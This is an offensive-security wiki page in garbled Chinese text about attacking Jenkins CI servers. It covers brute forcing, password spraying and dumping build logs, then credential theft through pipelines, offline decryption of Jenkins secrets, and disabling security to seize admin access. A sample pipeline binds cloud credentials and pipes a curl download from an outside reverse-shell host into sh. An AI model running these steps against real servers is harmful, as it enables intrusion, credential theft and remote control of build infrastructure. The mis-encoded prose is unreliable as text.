# Jenkinså®‰å…¨

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWSçº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## åŸºæœ¬ä¿¡æ¯

Jenkinsæ˜¯ä¸€ç§å·¥å…·ï¼Œæä¾›äº†ä¸€ç§ç®€å•çš„æ–¹æ³•ï¼Œå¯ä»¥ä½¿ç”¨æµæ°´çº¿ä¸ºå‡ ä¹**ä»»ä½•**ç¼–ç¨‹è¯­è¨€å’Œæºä»£ç ä»“åº“å»ºç«‹**æŒç»­é›†æˆ**æˆ–**æŒç»­äº¤ä»˜**ï¼ˆCI/CDï¼‰ç¯å¢ƒã€‚æ­¤å¤–ï¼Œå®ƒè‡ªåŠ¨åŒ–äº†å„ç§å¸¸è§„å¼€å‘ä»»åŠ¡ã€‚è™½ç„¶Jenkinsä¸èƒ½æ¶ˆé™¤**ä¸ºå„ä¸ªæ­¥éª¤åˆ›å»ºè„šæœ¬çš„éœ€è¦**ï¼Œä½†å®ƒæä¾›äº†ä¸€ç§æ¯”æ‰‹åŠ¨æ„å»ºæ•´ä¸ªæ„å»ºã€æµ‹è¯•å’Œéƒ¨ç½²å·¥å…·åºåˆ—æ›´å¿«é€Ÿã€æ›´å¯é çš„é›†æˆæ–¹å¼ã€‚

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

## æœªç»èº«ä»½éªŒè¯çš„æšä¸¾

ä¸ºäº†åœ¨æ²¡æœ‰èº«ä»½éªŒè¯çš„æƒ…å†µä¸‹æœç´¢æœ‰è¶£çš„Jenkinsé¡µé¢ï¼ˆå¦‚ï¼ˆ_/people_æˆ–_/asynchPeople_ï¼Œè¿™äº›é¡µé¢åˆ—å‡ºäº†å½“å‰ç”¨æˆ·ï¼‰ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ï¼š
```
msf> use auxiliary/scanner/http/jenkins_enum
```
æ£€æŸ¥æ˜¯å¦å¯ä»¥åœ¨æ— éœ€èº«ä»½éªŒè¯çš„æƒ…å†µä¸‹æ‰§è¡Œå‘½ä»¤ï¼š
```
msf> use auxiliary/scanner/http/jenkins_command
```
æ²¡æœ‰å‡­è¯çš„æƒ…å†µä¸‹ï¼Œæ‚¨å¯ä»¥æŸ¥çœ‹ _**/asynchPeople/**_ è·¯å¾„æˆ– _**/securityRealm/user/admin/search/index?q=**_ æ¥è·å– **ç”¨æˆ·å**ã€‚

æ‚¨å¯ä»¥ä»è·¯å¾„ _**/oops**_ æˆ– _**/error**_ è·å– Jenkins ç‰ˆæœ¬ä¿¡æ¯ã€‚

![](<../../.gitbook/assets/image (146).png>)

### å·²çŸ¥æ¼æ´

{% embed url="https://github.com/gquere/pwn_jenkins" %}

## ç™»å½•

åœ¨åŸºæœ¬ä¿¡æ¯ä¸­ï¼Œæ‚¨å¯ä»¥æŸ¥çœ‹ **ç™»å½• Jenkins çš„æ‰€æœ‰æ–¹å¼**ï¼š

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### æ³¨å†Œ

æ‚¨å¯ä»¥æ‰¾åˆ°å…è®¸æ‚¨åˆ›å»ºå¸æˆ·å¹¶ç™»å½•çš„ Jenkins å®ä¾‹ã€‚å°±æ˜¯è¿™ä¹ˆç®€å•ã€‚

### **SSO ç™»å½•**

å¦‚æœå­˜åœ¨ **SSO åŠŸèƒ½**/**æ’ä»¶**ï¼Œåˆ™åº”å°è¯•ä½¿ç”¨æµ‹è¯•å¸æˆ·ï¼ˆå³æµ‹è¯• **Github/Bitbucket å¸æˆ·**ï¼‰ç™»å½•åº”ç”¨ç¨‹åºã€‚æ¥è‡ª[**è¿™é‡Œ**](https://emtunc.org/blog/01/2018/research-misconfigured-jenkins-servers/)çš„æŠ€å·§ã€‚

### æš´åŠ›ç ´è§£

**Jenkins** ç¼ºä¹ **å¯†ç ç­–ç•¥** å’Œ **ç”¨æˆ·åæš´åŠ›ç ´è§£é˜²æŠ¤**ã€‚å¿…é¡»è¿›è¡Œç”¨æˆ· **æš´åŠ›ç ´è§£**ï¼Œå› ä¸ºå¯èƒ½å­˜åœ¨ä½¿ç”¨ **å¼±å¯†ç ** æˆ– **ç”¨æˆ·åä½œä¸ºå¯†ç **ï¼Œç”šè‡³ **åè½¬çš„ç”¨æˆ·åä½œä¸ºå¯†ç ** çš„æƒ…å†µã€‚
```
msf> use auxiliary/scanner/http/jenkins_login
```
### å¯†ç å–·æ´’æ”»å‡»

ä½¿ç”¨[æ­¤Pythonè„šæœ¬](https://github.com/gquere/pwn_jenkins/blob/master/password_spraying/jenkins_password_spraying.py)æˆ–[æ­¤PowerShellè„šæœ¬](https://github.com/chryzsh/JenkinsPasswordSpray)ã€‚

### IPç™½åå•ç»•è¿‡

è®¸å¤šç»„ç»‡å°†**åŸºäºSaaSçš„æºä»£ç ç®¡ç†ï¼ˆSCMï¼‰ç³»ç»Ÿ**ï¼ˆå¦‚GitHubæˆ–GitLabï¼‰ä¸**å†…éƒ¨è‡ªæ‰˜ç®¡çš„CI**è§£å†³æ–¹æ¡ˆï¼ˆå¦‚Jenkinsæˆ–TeamCityï¼‰ç»“åˆåœ¨ä¸€èµ·ã€‚è¿™ç§è®¾ç½®å…è®¸CIç³»ç»Ÿä»**SaaSæºä»£ç ç®¡ç†ä¾›åº”å•†æ¥æ”¶webhookäº‹ä»¶**ï¼Œä¸»è¦ç”¨äºè§¦å‘æµæ°´çº¿ä½œä¸šã€‚

ä¸ºäº†å®ç°è¿™ä¸€ç‚¹ï¼Œç»„ç»‡ä¼š**ç™½åå•** **SCMå¹³å°çš„IPèŒƒå›´**ï¼Œå…è®¸å®ƒä»¬é€šè¿‡**webhook**è®¿é—®**å†…éƒ¨CIç³»ç»Ÿ**ã€‚ç„¶è€Œï¼Œé‡è¦çš„æ˜¯è¦æ³¨æ„ï¼Œ**ä»»ä½•äºº**éƒ½å¯ä»¥åœ¨GitHubæˆ–GitLabä¸Šåˆ›å»ºä¸€ä¸ª**å¸æˆ·**å¹¶é…ç½®å®ƒæ¥**è§¦å‘webhook**ï¼Œæ½œåœ¨åœ°å‘**å†…éƒ¨CIç³»ç»Ÿ**å‘é€è¯·æ±‚ã€‚

æŸ¥çœ‹ï¼š[shttps://www.cidersecurity.io/blog/research/how-we-abused-repository-webhooks-to-access-internal-ci-systems-at-scale/](https://www.cidersecurity.io/blog/research/how-we-abused-repository-webhooks-to-access-internal-ci-systems-at-scale/)

## å†…éƒ¨Jenkinsæ»¥ç”¨

åœ¨è¿™äº›åœºæ™¯ä¸­ï¼Œæˆ‘ä»¬å‡è®¾æ‚¨æœ‰ä¸€ä¸ªæœ‰æ•ˆçš„å¸æˆ·æ¥è®¿é—®Jenkinsã€‚

{% hint style="warning" %}
æ ¹æ®Jenkinsä¸­é…ç½®çš„**æˆæƒ**æœºåˆ¶å’Œå—æŸç”¨æˆ·çš„æƒé™ï¼Œæ‚¨**å¯èƒ½èƒ½å¤Ÿæˆ–æ— æ³•æ‰§è¡Œä»¥ä¸‹æ”»å‡»ã€‚**
{% endhint %}

æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹åŸºæœ¬ä¿¡æ¯ï¼š

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### åˆ—å‡ºç”¨æˆ·

å¦‚æœæ‚¨å·²ç»è®¿é—®äº†Jenkinsï¼Œæ‚¨å¯ä»¥åœ¨[http://127.0.0.1:8080/asynchPeople/](http://127.0.0.1:8080/asynchPeople/)ä¸­åˆ—å‡ºå…¶ä»–æ³¨å†Œç”¨æˆ·ã€‚

### è½¬å‚¨æ„å»ºä»¥æŸ¥æ‰¾æ˜æ–‡å¯†ç 

ä½¿ç”¨[æ­¤è„šæœ¬](https://github.com/gquere/pwn_jenkins/blob/master/dump_builds/jenkins_dump_builds.py)æ¥è½¬å‚¨æ„å»ºæ§åˆ¶å°è¾“å‡ºå’Œæ„å»ºç¯å¢ƒå˜é‡ï¼Œä»¥ä¾¿æ‰¾åˆ°æ˜æ–‡å¯†ç ã€‚
```bash
python3 jenkins_dump_builds.py -u alice -p alice http://127.0.0.1:8080/ -o build_dumps
cd build_dumps
gitleaks detect --no-git -v
```
### **çªƒå–SSHå‡­è¯**

å¦‚æœå—æŸç”¨æˆ·å…·æœ‰è¶³å¤Ÿçš„æƒé™æ¥åˆ›å»º/ä¿®æ”¹æ–°çš„JenkinsèŠ‚ç‚¹ï¼Œå¹¶ä¸”å·²ç»å­˜å‚¨äº†ç”¨äºè®¿é—®å…¶ä»–èŠ‚ç‚¹çš„SSHå‡­è¯ï¼Œä»–å¯ä»¥é€šè¿‡åˆ›å»º/ä¿®æ”¹èŠ‚ç‚¹å¹¶è®¾ç½®ä¸€ä¸ªä¸»æœºæ¥è®°å½•å‡­è¯è€Œçªƒå–è¿™äº›å‡­è¯ï¼Œè€Œæ— éœ€éªŒè¯ä¸»æœºå¯†é’¥ï¼š

![](<../../.gitbook/assets/image (218).png>)

é€šå¸¸ä¼šåœ¨**å…¨å±€æä¾›ç¨‹åº** (`/credentials/`) ä¸­æ‰¾åˆ°Jenkins SSHå‡­è¯ï¼Œå› æ­¤æ‚¨ä¹Ÿå¯ä»¥åƒè½¬å‚¨ä»»ä½•å…¶ä»–æœºå¯†ä¸€æ ·è½¬å‚¨å®ƒä»¬ã€‚æ›´å¤šä¿¡æ¯è¯·å‚é˜…[**è½¬å‚¨æœºå¯†éƒ¨åˆ†**](./#dumping-secrets)ã€‚

### **Jenkinsä¸­çš„RCE**

åœ¨JenkinsæœåŠ¡å™¨ä¸­è·å¾—**shell**ä¼šä½¿æ”»å‡»è€…æœ‰æœºä¼šæ³„éœ²æ‰€æœ‰**æœºå¯†**å’Œ**ç¯å¢ƒå˜é‡**ï¼Œå¹¶ä¸”å¯ä»¥**åˆ©ç”¨åŒä¸€ç½‘ç»œä¸­çš„å…¶ä»–æœºå™¨**ç”šè‡³**æ”¶é›†äº‘å‡­è¯**ã€‚

é»˜è®¤æƒ…å†µä¸‹ï¼ŒJenkinså°†**ä½œä¸ºSYSTEMè¿è¡Œ**ã€‚å› æ­¤ï¼Œå¯¹å…¶è¿›è¡Œå¦¥åå°†èµ‹äºˆæ”»å‡»è€…**SYSTEMæƒé™**ã€‚

### **åˆ›å»º/ä¿®æ”¹é¡¹ç›®ä¸­çš„RCE**

åˆ›å»º/ä¿®æ”¹é¡¹ç›®æ˜¯è·å¾—JenkinsæœåŠ¡å™¨ä¸Šçš„RCEçš„ä¸€ç§æ–¹æ³•ï¼š

{% content-ref url="jenkins-rce-creating-modifying-project.md" %}
[jenkins-rce-creating-modifying-project.md](jenkins-rce-creating-modifying-project.md)
{% endcontent-ref %}

### **æ‰§è¡ŒGroovyè„šæœ¬ä¸­çš„RCE**

æ‚¨è¿˜å¯ä»¥é€šè¿‡æ‰§è¡ŒGroovyè„šæœ¬è·å¾—RCEï¼Œè¿™å¯èƒ½æ¯”åˆ›å»ºæ–°é¡¹ç›®æ›´éšè”½ï¼š

{% content-ref url="jenkins-rce-with-groovy-script.md" %}
[jenkins-rce-with-groovy-script.md](jenkins-rce-with-groovy-script.md)
{% endcontent-ref %}

### åˆ›å»º/ä¿®æ”¹Pipelineä¸­çš„RCE

æ‚¨è¿˜å¯ä»¥é€šè¿‡åˆ›å»º/ä¿®æ”¹ç®¡é“**è·å¾—RCE**ï¼š

{% content-ref url="jenkins-rce-creating-modifying-pipeline.md" %}
[jenkins-rce-creating-modifying-pipeline.md](jenkins-rce-creating-modifying-pipeline.md)
{% endcontent-ref %}

## ç®¡é“åˆ©ç”¨

è¦åˆ©ç”¨ç®¡é“ï¼Œæ‚¨ä»ç„¶éœ€è¦è®¿é—®Jenkinsã€‚

### æ„å»ºç®¡é“

**ç®¡é“**ä¹Ÿå¯ä»¥ç”¨ä½œé¡¹ç›®ä¸­çš„**æ„å»ºæœºåˆ¶**ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¯ä»¥é…ç½®ä¸€ä¸ª**å­˜å‚¨åœ¨å­˜å‚¨åº“ä¸­çš„æ–‡ä»¶**ï¼Œå…¶ä¸­åŒ…å«ç®¡é“è¯­æ³•ã€‚é»˜è®¤æƒ…å†µä¸‹ä½¿ç”¨ `/Jenkinsfile`ï¼š

![](<../../.gitbook/assets/image (127).png>)

è¿˜å¯ä»¥**å°†ç®¡é“é…ç½®æ–‡ä»¶å­˜å‚¨åœ¨å…¶ä»–ä½ç½®**ï¼ˆä¾‹å¦‚å…¶ä»–å­˜å‚¨åº“ï¼‰ä»¥å®ç°**åˆ†ç¦»**å­˜å‚¨åº“**è®¿é—®**å’Œç®¡é“è®¿é—®çš„ç›®çš„ã€‚

å¦‚æœæ”»å‡»è€…å…·æœ‰å¯¹è¯¥æ–‡ä»¶çš„**å†™å…¥è®¿é—®æƒé™**ï¼Œä»–å°†èƒ½å¤Ÿ**ä¿®æ”¹**å®ƒå¹¶**æ½œåœ¨åœ°è§¦å‘**ç®¡é“ï¼Œç”šè‡³æ— éœ€è®¿é—®Jenkinsã€‚\
æ”»å‡»è€…å¯èƒ½éœ€è¦**ç»•è¿‡ä¸€äº›åˆ†æ”¯ä¿æŠ¤**ï¼ˆå–å†³äºå¹³å°å’Œç”¨æˆ·æƒé™ï¼Œå¯èƒ½ä¼šè¢«ç»•è¿‡æˆ–ä¸ä¼šè¢«ç»•è¿‡ï¼‰ã€‚

æ‰§è¡Œè‡ªå®šä¹‰ç®¡é“çš„æœ€å¸¸è§è§¦å‘å™¨åŒ…æ‹¬ï¼š

* å‘ä¸»åˆ†æ”¯å‘èµ·**æ‹‰å–è¯·æ±‚**ï¼ˆæˆ–å¯èƒ½æ˜¯å…¶ä»–åˆ†æ”¯ï¼‰
* å‘ä¸»åˆ†æ”¯**æ¨é€**ï¼ˆæˆ–å¯èƒ½æ˜¯å…¶ä»–åˆ†æ”¯ï¼‰
* **æ›´æ–°ä¸»åˆ†æ”¯**å¹¶ç­‰å¾…æŸç§æ–¹å¼æ‰§è¡Œ

{% hint style="info" %}
å¦‚æœæ‚¨æ˜¯**å¤–éƒ¨ç”¨æˆ·**ï¼Œä¸åº”æœŸæœ›åˆ›å»º**é’ˆå¯¹å…¶ä»–ç”¨æˆ·/ç»„ç»‡å­˜å‚¨åº“çš„ä¸»åˆ†æ”¯PR**å¹¶**è§¦å‘ç®¡é“**...ä½†å¦‚æœ**é…ç½®ä¸å½“**ï¼Œæ‚¨å¯èƒ½å®Œå…¨**é€šè¿‡åˆ©ç”¨æ­¤æ–¹æ³•å¦¥åå…¬å¸**ã€‚
{% endhint %}

### ç®¡é“RCE

åœ¨å‰é¢çš„RCEéƒ¨åˆ†ä¸­å·²ç»æŒ‡å‡ºäº†ä¸€ç§æŠ€æœ¯æ¥[**ä¿®æ”¹ç®¡é“ä»¥è·å¾—RCE**](./#rce-creating-modifying-pipeline)ã€‚

### æ£€æŸ¥ç¯å¢ƒå˜é‡

å¯ä»¥ä¸ºæ•´ä¸ªç®¡é“æˆ–ç‰¹å®šé˜¶æ®µå£°æ˜**æ˜æ–‡ç¯å¢ƒå˜é‡**ã€‚è¿™äº›ç¯å¢ƒå˜é‡**ä¸åº”åŒ…å«æ•æ„Ÿä¿¡æ¯**ï¼Œä½†æ”»å‡»è€…å§‹ç»ˆå¯ä»¥**æ£€æŸ¥æ‰€æœ‰ç®¡é“**é…ç½®/Jenkinsfilesï¼š
```bash
pipeline {
agent {label 'built-in'}
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
```
### å¯†é’¥è½¬å‚¨

æœ‰å…³ Jenkins å¦‚ä½•å¤„ç†å¯†é’¥çš„ä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹åŸºæœ¬ä¿¡æ¯ï¼š

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

å‡­æ®å¯ä»¥**é™å®šä¸ºå…¨å±€æä¾›è€…**ï¼ˆ`/credentials/`ï¼‰æˆ–**ç‰¹å®šé¡¹ç›®**ï¼ˆ`/job/<project-name>/configure`ï¼‰ã€‚å› æ­¤ï¼Œä¸ºäº†**æå–æ‰€æœ‰å‡­æ®**ï¼Œæ‚¨éœ€è¦**è‡³å°‘å…¥ä¾µåŒ…å«å¯†é’¥çš„æ‰€æœ‰é¡¹ç›®**å¹¶æ‰§è¡Œè‡ªå®šä¹‰/æ¶æ„çš„æµæ°´çº¿ã€‚

è¿˜æœ‰å¦ä¸€ä¸ªé—®é¢˜ï¼Œä¸ºäº†åœ¨æµæ°´çº¿çš„**ç¯å¢ƒä¸­è·å–å¯†é’¥**ï¼Œæ‚¨éœ€è¦**çŸ¥é“å¯†é’¥çš„åç§°å’Œç±»å‹**ã€‚ä¾‹å¦‚ï¼Œå¦‚æœæ‚¨å°è¯•å°†ä¸€ä¸ª**`usernamePassword`** **å¯†é’¥**åŠ è½½ä¸º**`string`** **å¯†é’¥**ï¼Œæ‚¨å°†æ”¶åˆ°æ­¤**é”™è¯¯**ï¼š
```
ERROR: Credentials 'flag2' is of type 'Username with password' where 'org.jenkinsci.plugins.plaincredentials.StringCredentials' was expected
```
ä»¥ä¸‹æ˜¯åŠ è½½ä¸€äº›å¸¸è§ç§˜å¯†ç±»å‹çš„æ–¹æ³•ï¼š

- **Secret Text**: ä½¿ç”¨`Secret text`å‡­è¯ç±»å‹ï¼Œå°†ç§˜å¯†æ–‡æœ¬ç›´æ¥å­˜å‚¨åœ¨Jenkinsä¸­ã€‚
- **Username and Password**: ä½¿ç”¨`Username with password`å‡­è¯ç±»å‹ï¼Œå°†ç”¨æˆ·åå’Œå¯†ç å­˜å‚¨åœ¨Jenkinsä¸­ã€‚
- **Secret File**: ä½¿ç”¨`Secret file`å‡­è¯ç±»å‹ï¼Œå°†ç§˜å¯†æ–‡ä»¶ä¸Šä¼ åˆ°Jenkinsä¸­ã€‚
```bash
withCredentials([usernamePassword(credentialsId: 'flag2', usernameVariable: 'USERNAME', passwordVariable: 'PASS')]) {
sh '''
env #Search for USERNAME and PASS
'''
}

withCredentials([string(credentialsId: 'flag1', variable: 'SECRET')]) {
sh '''
env #Search for SECRET
'''
}

withCredentials([usernameColonPassword(credentialsId: 'mylogin', variable: 'USERPASS')]) {
sh '''
env # Search for USERPASS
'''
}

# You can also load multiple env variables at once
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
env
'''
}
```
åœ¨æœ¬é¡µçš„æœ«å°¾ï¼Œæ‚¨å¯ä»¥**æ‰¾åˆ°æ‰€æœ‰çš„å‡­è¯ç±»å‹**ï¼š[https://www.jenkins.io/doc/pipeline/steps/credentials-binding/](https://www.jenkins.io/doc/pipeline/steps/credentials-binding/)

{% hint style="warning" %}
**ä¸€æ¬¡æ€§å€¾æ³„æ‰€æœ‰ç§˜å¯†**çš„æœ€ä½³æ–¹æ³•æ˜¯é€šè¿‡**å…¥ä¾µ** **Jenkins** æœºå™¨ï¼ˆä¾‹å¦‚åœ¨**å†…ç½®èŠ‚ç‚¹**ä¸­è¿è¡Œåå‘ shellï¼‰ï¼Œç„¶å**æ³„æ¼** **ä¸»å¯†é’¥**å’Œ**åŠ å¯†çš„ç§˜å¯†**ï¼Œå¹¶åœ¨ç¦»çº¿çŠ¶æ€ä¸‹å¯¹å…¶è¿›è¡Œè§£å¯†ã€‚\
æœ‰å…³å¦‚ä½•æ‰§è¡Œæ­¤æ“ä½œï¼Œè¯·å‚é˜…[èŠ‚ç‚¹å’Œä»£ç†éƒ¨åˆ†](./#nodes-and-agents)å’Œ[åæ¸—é€éƒ¨åˆ†](./#post-exploitation)ã€‚
{% endhint %}

### è§¦å‘å™¨

æ¥è‡ª[æ–‡æ¡£](https://www.jenkins.io/doc/book/pipeline/syntax/#triggers)ï¼š`triggers` æŒ‡ä»¤å®šä¹‰äº†åº”é‡æ–°è§¦å‘ Pipeline çš„**è‡ªåŠ¨æ–¹å¼**ã€‚å¯¹äºä¸ GitHub æˆ– BitBucket ç­‰æºé›†æˆçš„ Pipelineï¼Œå¯èƒ½ä¸éœ€è¦ `triggers`ï¼Œå› ä¸ºåŸºäº Webhooks çš„é›†æˆå¯èƒ½å·²ç»å­˜åœ¨ã€‚ç›®å‰å¯ç”¨çš„è§¦å‘å™¨åŒ…æ‹¬ `cron`ã€`pollSCM` å’Œ `upstream`ã€‚

Cron ç¤ºä¾‹ï¼š
```bash
triggers { cron('H */4 * * 1-5') }
```
æŸ¥çœ‹**æ–‡æ¡£ä¸­çš„å…¶ä»–ç¤ºä¾‹**ã€‚

### èŠ‚ç‚¹å’Œä»£ç†

ä¸€ä¸ª**Jenkinså®ä¾‹**å¯èƒ½åœ¨ä¸åŒçš„æœºå™¨ä¸Šè¿è¡Œ**ä¸åŒçš„ä»£ç†**ã€‚ä»æ”»å‡»è€…çš„è§’åº¦æ¥çœ‹ï¼Œè®¿é—®ä¸åŒçš„æœºå™¨æ„å‘³ç€å¯ä»¥çªƒå–**ä¸åŒçš„æ½œåœ¨äº‘å‡­è¯**æˆ–è€…æ»¥ç”¨**ä¸åŒçš„ç½‘ç»œè®¿é—®**æ¥åˆ©ç”¨å…¶ä»–æœºå™¨ã€‚

æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹åŸºæœ¬ä¿¡æ¯ï¼š

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

æ‚¨å¯ä»¥æšä¸¾`/computer/`ä¸­**é…ç½®çš„èŠ‚ç‚¹**ï¼Œé€šå¸¸ä¼šæ‰¾åˆ°\*\*`å†…ç½®èŠ‚ç‚¹` \*\*ï¼ˆè¿è¡ŒJenkinsçš„èŠ‚ç‚¹ï¼‰å’Œå¯èƒ½è¿˜æœ‰å…¶ä»–èŠ‚ç‚¹ï¼š

![](<../../.gitbook/assets/image (249).png>)

**ç‰¹åˆ«æœ‰è¶£çš„æ˜¯å¦¥åå†…ç½®èŠ‚ç‚¹**ï¼Œå› ä¸ºå®ƒåŒ…å«æ•æ„Ÿçš„Jenkinsä¿¡æ¯ã€‚

è¦æŒ‡ç¤ºæ‚¨æƒ³åœ¨**å†…ç½®JenkinsèŠ‚ç‚¹**ä¸­**è¿è¡Œ**æµæ°´çº¿ï¼Œæ‚¨å¯ä»¥åœ¨æµæ°´çº¿ä¸­æŒ‡å®šä»¥ä¸‹é…ç½®ï¼š
```bash
pipeline {
agent {label 'built-in'}
```
### å®Œæ•´ç¤ºä¾‹

åœ¨ç‰¹å®šä»£ç†ä¸­çš„æµæ°´çº¿ï¼Œä½¿ç”¨cronè§¦å‘å™¨ï¼Œå…·æœ‰æµæ°´çº¿å’Œé˜¶æ®µç¯å¢ƒå˜é‡ï¼Œåœ¨ä¸€ä¸ªæ­¥éª¤ä¸­åŠ è½½2ä¸ªå˜é‡å¹¶å‘é€åå‘shellï¼š
```bash
pipeline {
agent {label 'built-in'}
triggers { cron('H */4 * * 1-5') }
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
curl https://reverse-shell.sh/0.tcp.ngrok.io:16287 | sh PASS
'''
}
}
}

post {
always {
cleanWs()
}
}
}
```
## åæ¸—é€

### Metasploit
```
msf> post/multi/gather/jenkins_gather
```
### Jenkins Secrets

å¦‚æœæ‚¨æ‹¥æœ‰è¶³å¤Ÿçš„æƒé™ï¼Œå¯ä»¥è®¿é—® `/credentials/` æ¥åˆ—å‡ºç§˜å¯†ã€‚è¯·æ³¨æ„ï¼Œè¿™å°†ä»…åˆ—å‡º`credentials.xml`æ–‡ä»¶ä¸­çš„ç§˜å¯†ï¼Œä½†**æ„å»ºé…ç½®æ–‡ä»¶**å¯èƒ½è¿˜åŒ…å«**æ›´å¤šå‡­æ®**ã€‚

å¦‚æœæ‚¨å¯ä»¥**æŸ¥çœ‹æ¯ä¸ªé¡¹ç›®çš„é…ç½®**ï¼Œæ‚¨è¿˜å¯ä»¥åœ¨å…¶ä¸­çœ‹åˆ°ç”¨äºè®¿é—®å­˜å‚¨åº“çš„**å‡­æ®ï¼ˆç§˜å¯†ï¼‰åç§°**å’Œ**é¡¹ç›®çš„å…¶ä»–å‡­æ®**ã€‚

![](<../../.gitbook/assets/image (180).png>)

#### ä» Groovy

{% content-ref url="jenkins-dumping-secrets-from-groovy.md" %}
[jenkins-dumping-secrets-from-groovy.md](jenkins-dumping-secrets-from-groovy.md)
{% endcontent-ref %}

#### ä»ç£ç›˜

è¿™äº›æ–‡ä»¶ç”¨äº**è§£å¯† Jenkins ç§˜å¯†**ï¼š

* secrets/master.key
* secrets/hudson.util.Secret

è¿™æ ·çš„**ç§˜å¯†é€šå¸¸å¯ä»¥åœ¨**ä»¥ä¸‹ä½ç½®æ‰¾åˆ°ï¼š

* credentials.xml
* jobs/.../build.xml
* jobs/.../config.xml

ä»¥ä¸‹æ˜¯ç”¨äºæŸ¥æ‰¾å®ƒä»¬çš„æ­£åˆ™è¡¨è¾¾å¼ï¼š
```bash
# Find the secrets
grep -re "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"
# Print only the filenames where the secrets are located
grep -lre "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"

# Secret example
credentials.xml: <secret>{AQAAABAAAAAwsSbQDNcKIRQMjEMYYJeSIxi2d3MHmsfW3d1Y52KMOmZ9tLYyOzTSvNoTXdvHpx/kkEbRZS9OYoqzGsIFXtg7cw==}</secret>
```
#### ç¦»çº¿è§£å¯† Jenkins å¯†é’¥

å¦‚æœæ‚¨å·²ç»è½¬å‚¨äº†**è§£å¯†å¯†é’¥æ‰€éœ€çš„å¯†ç **ï¼Œè¯·ä½¿ç”¨[**æ­¤è„šæœ¬**](https://github.com/gquere/pwn_jenkins/blob/master/offline_decryption/jenkins_offline_decrypt.py) **æ¥è§£å¯†è¿™äº›å¯†é’¥**ã€‚
```bash
python3 jenkins_offline_decrypt.py master.key hudson.util.Secret cred.xml
06165DF2-C047-4402-8CAB-1C8EC526C115
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAt985Hbb8KfIImS6dZlVG6swiotCiIlg/P7aME9PvZNUgg2Iyf2FT
```
#### ä»Groovyä¸­è§£å¯†Jenkinsç§˜å¯†
```bash
println(hudson.util.Secret.decrypt("{...}"))
```
### åˆ›å»ºæ–°çš„ç®¡ç†å‘˜ç”¨æˆ·

1. è®¿é—®`/var/lib/jenkins/config.xml`æˆ–`C:\Program Files (x86)\Jenkis\`ä¸­çš„Jenkins config.xmlæ–‡ä»¶ã€‚
2. æœç´¢å•è¯`<useSecurity>true</useSecurity>`ï¼Œå°†å•è¯`true`æ›´æ”¹ä¸º`false`ã€‚
3. è¿è¡Œå‘½ä»¤`sed -i -e 's/<useSecurity>true</<useSecurity>false</g' config.xml`ã€‚
4. **é‡æ–°å¯åŠ¨** **Jenkins** æœåŠ¡å™¨ï¼š`service jenkins restart`ã€‚
5. ç°åœ¨å†æ¬¡è®¿é—®Jenkinsé—¨æˆ·ï¼Œå¹¶ä¸”**Jenkinsä¸ä¼šè¦æ±‚ä»»ä½•å‡­æ®**ã€‚æ‚¨å¯ä»¥å¯¼èˆªåˆ°â€œ**ç®¡ç†Jenkins**â€ä»¥é‡æ–°è®¾ç½®**ç®¡ç†å‘˜å¯†ç **ã€‚
